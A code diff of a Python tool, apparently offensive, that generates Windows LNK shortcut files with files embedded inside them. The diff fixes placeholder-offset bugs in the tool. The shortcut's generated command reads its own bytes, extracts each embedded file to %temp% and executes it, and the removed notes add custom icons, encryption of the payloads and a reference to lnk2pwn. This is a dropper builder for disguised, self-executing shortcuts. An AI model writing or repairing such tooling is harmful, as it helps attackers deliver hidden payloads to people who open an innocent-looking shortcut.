@@ -1,37 +1,6 @@
 import os
 import argparse
 import win32com.client
-
-'''
-UN generador de LNKs que puede generar distintos tipos de LNK.
-
-Parámetros:
-1. Interprete de comandos
-2. Comando a ejecutar
-3. Icono custom (numero)
-4. Nombre a guardar + PATH
-5. FIchero a Incrustar (Puede haber varios) --> HArá APPEND
-
-Extra:
-- Poder definir el path donde guardar ficheros extraidos.
-- Encriptar ficheros -> FIcheros config para clave y tal...
-- Soportar más de 9 attachments
-- Default attachment?? QUe sea capaz de crear uno y añadirlo
-- Definir el WindowStyle del LNK
-- Con tantos parámetros lo mejor sería usar un Config file y pasarselo... Un JSON... Así más fácil añadir también ficheros a acoplar y donde exportarlos y tal. Y booleanos y demás.
-
-Dudas: 
-- Pensar como hago lo de comando y attachments... EL comando donde se pone al inicio o al final???
-- Ficheros incrustados por defecto los abrirá... pero estaría bien poner opción para definir el comportamiento...
-
-Esto hace algo parecido: https://github.com/tommelo/lnk2pwn/tree/master
-'''
-
-''' TODO 
-- Rethink loops to improve efficiency. Maybe size calculation and placeholder replacement can be done at the same time...
-- Can I combine a command with attachment files???
-'''
-
 '''
 Limitations:
 - If attachments are used, the LNK will call powershell.
@@ -44,13 +13,15 @@ Dictionary to store placeholders and their respective values. We have a generic 
 - 00003 -> Placeholder number 0 for attachment 1
 - 00004 -> Placeholder number 1 for attachment 1
 Ando so on...
-Like (Placeholder num+attNum)
+Like (Placeholder num+attNum*placeholders_per_attachment)
 
 The attachment are numbered starting from 0.
 '''
 plh_dic = {}
 
 current_dir = os.getcwd()
+
+plh_per_attachment = 2
 
 def create_lnk_file(path, icon, interpreter, arguments, delete_existing = False):
     try:
@@ -85,7 +56,7 @@ def prepare_arguments(interpreter, command, attachments):
     for attachment in attachments:                
         attFileName= os.path.basename(attachment)
         # Store the index of the placeholder,Format them in the string with the appropiate lenght of number (8 numbers)
-        plh_index = att_num + 1 # This only works if every attachment has only 2 placeholders...
+        plh_index = att_num*plh_per_attachment + 1
         attachment_string = fr"$att{att_num}File = gc $lnkpath -Encoding Byte -TotalCount {plh_index:08d} -ReadCount {plh_index:08d}; $att{att_num}Path = '%temp%\{attFileName}'; sc $att{att_num}Path ([byte[]]($att{att_num}File ^| select -Skip {plh_index+1:08d})) -Encoding Byte; ^& $att{att_num}Path;"
         
         # Store Placeholders in dictionary
@@ -106,7 +77,7 @@ def compute_sizes(lnk_path, attachments):
     lnk_size = os.path.getsize(lnk_path)
     previous_elem_size = lnk_size
     for i in range(len(attachments)): # i is the index of attachment
-        plh_index = i + 1
+        plh_index = i*plh_per_attachment + 1
         att_size = os.path.getsize(attachments[i])
         plh_dic[f"{plh_index:08d}"] = f'{(previous_elem_size + att_size):08d}'
         plh_dic[f"{plh_index+1:08d}"] = f'{(previous_elem_size):08d}'
@@ -119,9 +90,9 @@ def compute_sizes(lnk_path, attachments):
 '''
 Iterate over the placeholders 
 '''
-def overwrite_plh_with_sizes(command, attachments):
+def overwrite_plh_with_sizes(command):
     for key, value in plh_dic.items():
-        command.replace(key, value)
+        command = command.replace(key, value)
 
     return command
 
@@ -168,7 +139,7 @@ def main():
         compute_sizes(lnk_path, args.attachments)
 
         # Overwrite placeholders with real sizes
-        lnk_arguments = overwrite_plh_with_sizes(lnk_arguments, args.attachments)
+        lnk_arguments = overwrite_plh_with_sizes(lnk_arguments)
         
     # Write final LNK file 
     create_lnk_file(lnk_path, lnk_icon, lnk_interpreter, lnk_arguments, True)
